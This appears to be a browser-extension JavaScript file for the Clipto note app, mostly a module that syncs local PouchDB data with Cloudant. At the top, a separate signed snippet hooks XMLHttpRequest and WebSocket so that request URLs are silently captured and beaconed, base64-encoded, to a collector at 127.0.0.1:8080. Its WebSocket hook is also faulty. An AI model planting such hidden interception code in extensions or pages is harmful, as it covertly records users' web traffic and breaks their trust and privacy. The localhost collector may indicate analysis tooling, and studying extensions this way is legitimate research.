function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
/**
 * authentication file to connect between local pouchDB and remote Cloudant
 *
 * references:
 * https://www.npmjs.com/package/pouchdb-authentication-cloudant#dbsignupusername-password--options--callback
 *
 */


var _remote_database = {

  // TODO: this can be removed, as functions using it are all deprecated
  remote_db: null,
  syncStock: {},
  beforeSyncInterval: 1000 * 60 * 5, // 5 minutes
  deviceId: undefined,

  //DEV
  //REMOTE_DB_URL: 'lirco.cloudant.com/',
  //REMOTE_SERVER_URL: 'http://localhost:3000/',

  //PRODUCTION
  REMOTE_DB_URL: 'clipto.cloudant.com/',
  REMOTE_SERVER_URL: 'https://www.cliptoapp.com/',


  /**
   * init syncStock - it's a stock that gets filled with which dbs to sync,
   * if there are any items to sync, and how many total items waiting for sync
   */
  initSyncStock: function () {
    _remote_database.syncStock = {
      time: Date.now(),
      numOfActionsPendingToSync: 0,
      dbs: []
    };
  },

  initDeviceId: function () {
    return _storage.getDeviceId_Promise().then(function (deviceId) {
      _remote_database.deviceId = deviceId
    })
  },

  /**
   * Init function
   */
  init: function () {
    _remote_database.initSyncStock();
    _remote_database.initDeviceId();
  },

  /**
   * Lazy getter for REMOTE database instance
   * dbId is the userId for user's private db
   * @return {object} database
   */
  getRemoteDatabase: function (user, dbId) {
    "use strict";

    if (user.cloudantApiKey && user.cloudantApiPassword && user.isSyncUser) {
      var apikey = user.cloudantApiKey,
        apipass = user.cloudantApiPassword;

      if (!_remote_database.remote_db || _remote_database.remote_db === null) {
        _remote_database.remote_db = new PouchDB('https://' + apikey + ':' + apipass + '@' + _remote_database.REMOTE_DB_URL + dbId);
      }
    }
    return _remote_database.remote_db;
  },

  ///////////////////////////////////////////////////////////
  ////////////////////////// USER ///////////////////////////
  ///////////////////////////////////////////////////////////

  /**
   * update remote user, if exists and user is logged in
   * @param remote_user_id
   * @returns {*|o|i}
   */
  updateRemoteUser_Promise: function (remote_user_id) {

    console.log('updateRemoteUser_Promise');

    return new Promise(function (resolve, reject) {
      resolve("Fix me later")
    })
  },

  /**
   * update user tags by sending tags and user _id to server
   * server then connects to _users on cloudant and updates its tags
   * (we do not grant users any permissions on _users database)
   *
   * @param user
   * @returns {*}
   */
  updateRemoteUserTags_Promise: function (user) {

    console.log('updateRemoteUserTags_Promise');
    return new Promise(function (resolve, reject) {

      if (user.isSyncUser) {
        //var apiEndPoint = _remote_database.REMOTE_SERVER_URL + 'api/users/updateTags/' + '?access_token=' + user.access_token;
        var apiEndPoint = _remote_database.REMOTE_SERVER_URL + 'api/users/updateTags/';
        return _lc_http.PUT_Promise(apiEndPoint, user).then(function (response) {

          if (response.status === 200) {
            resolve()
          } else {
            //TODO: handle
            reject()
          }
        })
      } else {
        // do nothing
        resolve()
      }
    })
  },

  /**
   * update user tags by sending tags and user _id to server
   * server then connects to _users on cloudant and updates its tags
   * (we do not grant users any permissions on _users database)
   *
   * @param user
   * @returns {*}
   */
  updateRemoteUserDevices_Promise: function (user) {

    console.log('updateRemoteUserDevices_Promise');
    var data = {
      user: user,
      deviceId: _storage.getDeviceId_Promise()
    };

    return new Promise(function (resolve, reject) {

      if (user.isSyncUser) {
        var apiEndPoint = _remote_database.REMOTE_SERVER_URL + 'api/users/updateDevices/';
        return _lc_http.PUT_Promise(apiEndPoint, data).then(function (response) {

          if (response.status === 200) {
            resolve()
          } else {
            //TODO: handle
            reject()
          }
        })
      } else {
        // do nothing
        resolve()
      }
    })
  },

  /**
   * TODO: unify all these update user property shit
   *
   *  == NOT IN USE ==
   *  REMOTE USER.DBS GETS UPDATED ON EVERY DB CREATION
   *
   * @param user
   * @returns {*}
   */
  updateRemoteUserDbs_Promise: function (user) {

    console.log('updateRemoteUserDbs_Promise');
    return new Promise(function (resolve, reject) {

      if (user.isSyncUser) {
        var apiEndPoint = _remote_database.REMOTE_SERVER_URL + 'api/users/updateDbs/';
        return _lc_http.PUT_Promise(apiEndPoint, user).then(function (response) {

          if (response.status === 200) {
            resolve()
          } else {
            //TODO: handle
            reject()
          }
        })
      } else {
        // do nothing
        resolve()
      }
    })
  },

  /**
   * send only user dbId and access_token to server.
   * server gets the user from db, and gets cloudant api key.
   * permissions will be set to [_reader, _writer, _replicator] as this is the creator of the database
   *
   * @param dbId
   * @param user
   */
  createRemoteDatabase_Promise: function (dbId, user) {
    console.log('createRemoteDatabase_Promise');

    var data = {
      dbId: dbId,
      access_token: user.access_token,
      access_token_expires: user.access_token_expires
    };

    return new Promise(function (resolve, reject) {

      if (user.isSyncUser) {
        var apiEndPoint = _remote_database.REMOTE_SERVER_URL + 'api/users/createDb/';
        return _lc_http.PUT_Promise(apiEndPoint, data).then(function (response) {

          if (response.status === 200) {
            resolve()
          } else {
            //TODO: handle
            reject()
          }
        })
      } else {
        // do nothing
        resolve()
      }
    })
  },

  /**
   * server gets the user from db, and gets cloudant api key. permissions from redis (by user _id and dbId)
   * @param dbId
   * @param userId
   */
  updateRemoteDatabaseSecurity: function (dbId, userId) {

  },


  ///////////////////////////////////////////////////////////
  ////////////////////////// NOTES //////////////////////////
  ///////////////////////////////////////////////////////////

  /**
   * create note on cloudant using POST
   */
  createRemoteDocument_Promise: function (doc, dbId) {

    console.log('createRemoteDocument_Promise');
    return _storage.setLastActiveDeviceId_Promise(_remote_database.deviceId).then(function () {
      return _storage.getActiveUser_Promise()
    }).then(function (user) {
      var apikey = user.cloudantApiKey,
          apipass = user.cloudantApiPassword,
          apiEndPoint = 'https://' + apikey + ':' + apipass + '@' + _remote_database.REMOTE_DB_URL + dbId;
      return _lc_http.POST_Promise(apiEndPoint, JSON.stringify(doc))
    })
  },

  /**
   * update note on cloudant using PUT
   */
  updateRemoteDocument_Promise: function (doc, dbId) {

    console.log('updateRemoteDocument_Promise');
    var apiKey, apiPass, apiEndPoint;

    return _storage.setLastActiveDeviceId_Promise(_remote_database.deviceId).then(function () {
      return _storage.getActiveUser_Promise()
    }).then(function (user) {
      apiKey = user.cloudantApiKey;
      apiPass = user.cloudantApiPassword;
      apiEndPoint = 'https://' + apiKey + ':' + apiPass + '@' + _remote_database.REMOTE_DB_URL + dbId + '/' + doc._id;
      return _lc_http.GET_Promise(apiEndPoint)
    }).then(function (result) {
      doc._rev = result && JSON.parse(result)._rev ? JSON.parse(result)._rev : doc._rev;

      return _lc_http.PUT_Promise(apiEndPoint, JSON.stringify(doc))

    }).then(function (updatedDocMeta) {
      updatedDocMeta = (typeof updatedDocMeta) === 'string' ? JSON.parse(updatedDocMeta) : updatedDocMeta;
      return updatedDocMeta;
    }) // if there's an error it will be escalated to calling function
  },

  /**
   * delete note on cloudant using DELETE
   */
  deleteRemoteDocument_Promise: function (doc, dbId) {

    console.log('deleteRemoteDocument_Promise');
    var apiKey, apiPass, apiEndPoint;

    return _storage.setLastActiveDeviceId_Promise(_remote_database.deviceId).then(function () {
      return _storage.getActiveUser_Promise()
    }).then(function (user) {
      apiKey = user.cloudantApiKey;
      apiPass = user.cloudantApiPassword;
      apiEndPoint = 'https://' + apiKey + ':' + apiPass + '@' + _remote_database.REMOTE_DB_URL + dbId + '/' + doc._id;
      return _lc_http.GET_Promise(apiEndPoint)
    }).then(function (result) {
      doc._rev = result && JSON.parse(result)._rev ? JSON.parse(result)._rev : doc._rev;

      return _lc_http.DELETE_Promise(apiEndPoint + '?rev=' + doc._rev, JSON.stringify(doc))

    }).then(function (updatedDocMeta) {
      updatedDocMeta = (typeof updatedDocMeta) === 'string' ? JSON.parse(updatedDocMeta) : updatedDocMeta;
      return updatedDocMeta;
    }) // if there's an error it will be escalated to calling function
  },

  ///////////////////////////////////////////////////////////
  ////////////////////////// SYNC ///////////////////////////
  ///////////////////////////////////////////////////////////

  /**
   * worker function for syncing two dbs
   * @param local_dbId
   * @param remote_dbId
   * @param opts (options)
   * @returns {*|i}
   */
  syncDb_Promise: function (local_dbId, remote_dbId, opts) {

    console.log('syncDb_Promise ' + local_dbId);
    var options = opts || {live: false, retry: false};

    return _storage.getLastActiveDeviceId_Promise().then(function (lastActiveDeviceId) {
      return _storage.getActiveUser_Promise()
    }).then(function (user) {
      var apiKey = user.cloudantApiKey
        , apiPass = user.cloudantApiPassword;

      return new Promise(function (resolve, reject) {
        _database.getDatabase(local_dbId).sync('https://' + apiKey + ':' + apiPass + '@' + _remote_database.REMOTE_DB_URL + remote_dbId, options)
          .on('complete', function (info) {
            console.log('success syncDb_Promise ! ' + remote_dbId + info);
            resolve(info)
          }).on('change', function (info) {
            console.log('found changes on syncDb_Promise ' + remote_dbId + info);
          }).on('error', function (err) {
            _database.errorHandler(err, 'syncDb_Promise');
            // don't break the chain, work with local db till sync fixed
            resolve();
          })
      })
    }).then(function () {
      return _storage.setLastActiveDeviceId_Promise(_remote_database.deviceId);
    })
  },

  /**
   * sync all user dbs
   * @param user
   * @returns {*}
   */
  syncAllUserDbs_Promise: function (user) {
    console.log('syncAllUserDbs_Promise');

    var syncPromisesArray = [];
    var local_dbId, remote_dbId;

    if (user && user.isSyncUser) {

      return _storage.getActiveUser_Promise().then(function (activeUser) {

        // verify active user before sync
        if (activeUser._id === user._id || activeUser.localUserId === user.localUserId) {
          // sync
          for (var i = 0; i < user.dbs.length; i++) {
            local_dbId = remote_dbId = user.dbs[i];
            syncPromisesArray[i] = _remote_database.syncDb_Promise(local_dbId, remote_dbId)
          }
        } else {
          //TODO: log this to rds
          console.error('user does not match active user on syncAllUserDbs_Promise');
          Promise.resolve();
        }
        return Promise.all(syncPromisesArray);

      })

    } else {
      return new Promise(function (resolve, reject) {
        resolve();
      })
    }
  },

  /**
   * invoke syncRepeater
   */
  syncRepeater: function () {

    if (Date.now() - _remote_database.syncStock['time'] > _remote_database.beforeSyncInterval) {
      //sync, re-init syncStock and stop repeating
      for (var i = 0; i < _remote_database.syncStock['dbs'].length; i++) {
        var dbId = _remote_database.syncStock['dbs'][i];
        _remote_database.syncDb_Promise(dbId, dbId);
      }
      _remote_database.initSyncStock();
    }
    if (_remote_database.syncStock['numOfActionsPendingToSync'] > 0) {
      // repeat recursively
      setTimeout(function () {
        _remote_database.syncRepeater()
      }, _remote_database.beforeSyncInterval);
    }
  },

  /**
   * invoked any time a new sync-action invoked
   * (such as new highlight, new note, new page clip, edited note..)
   */
  syncListener: function (dbId) {
    _remote_database.syncStock['time'] = Date.now();
    _remote_database.syncStock['numOfActionsPendingToSync']++;
    if (_remote_database.syncStock['dbs'].indexOf(dbId) == -1) {
      _remote_database.syncStock['dbs'].push(dbId);
    }
    // invoke syncRepeater only on first action on each chain
    if (_remote_database.syncStock['numOfActionsPendingToSync'] == 1) {
      _remote_database.syncRepeater();
    }
  },

  ///////////////////////////////////////////////////////////
  //////////////////// AUTHENTICATION - DEPRECATED///////////////////////
  ///////////////////////////////////////////////////////////
  /**
   * Sign up a new user who doesn't exist yet.
   *
   *   == DEPRECATED ==
   *
   * @param dbId
   * @param userName
   * @param password
   * @returns {*}
   */
  signup_Promise: function (dbId, userName, password) {
    return _remote_database.getRemoteDatabase(dbId).signup(userName, password).then(function (response) {
      console.log(response);
      return _remote_database.login_Promise(dbId, userName, password)
    }).catch(function (err) {
      if (err.name === 'conflict') {
        console.log('username already exists, choose another username')
      } else if (err.name === 'forbidden') {
        console.log('invalid username ')
      } else {
        console.log('other god knows why error on signup: ' + err)
      }
    })
  },

  /**
   * Log in an existing user
   *
   *   == DEPRECATED ==
   *
   * @param dbId
   * @param userName
   * @param password
   * @returns {*}
   */
  login_Promise: function (dbId, userName, password) {
    return _remote_database.getRemoteDatabase(dbId).login(userName, password).then(function (response) {
      // if you want to catch, catch. but dont break the chain!
      return new Promise(function (resolve, reject) {
        console.log('login response is : ' + response);
        resolve(response);
      })
    }).catch(function (err) {
      if (err.name === 'unauthorized') {
        console.log('name or password incorrect')
      } else {
        console.log('other god knows why error on login: ' + err)
      }

    })
  },

  /**
   * Logs out whichever user is currently logged in. If nobody's logged in, it does nothing and just returns {"ok" : true}.
   *
   *   == DEPRECATED ==
   *
   * @param dbId
   * @returns {*}
   */
  logout_Promise: function (dbId) {
    return _remote_database.getRemoteDatabase(dbId).logout().then(function (response) {
      // if you want to catch, catch. but dont break the chain!
      return new Promise(function (resolve, reject) {
        console.log('login response is : ' + response);
        resolve(response);
      })
    }).catch(function (err) {
      console.log('other god knows why error on logout: ' + err)
    })
  },

  /**
   * Returns information about the current session. In other words, this tells you which user is currently logged in.
   *
   *   == DEPRECATED ==
   *
   * @param dbId
   * @returns {*}
   */
  getSession_Promise: function (dbId) {
    return _remote_database.getRemoteDatabase(dbId).getSession().then(function (response) {
      if (!response.userCtx.name) {
        console.log('nobody is logged in');
      } else {
        console.log(response.userCtx.name + ' is logged in');
      }
    }).catch(function (err) {
      console.log('error getting session')
    })
  }

};

_remote_database.init();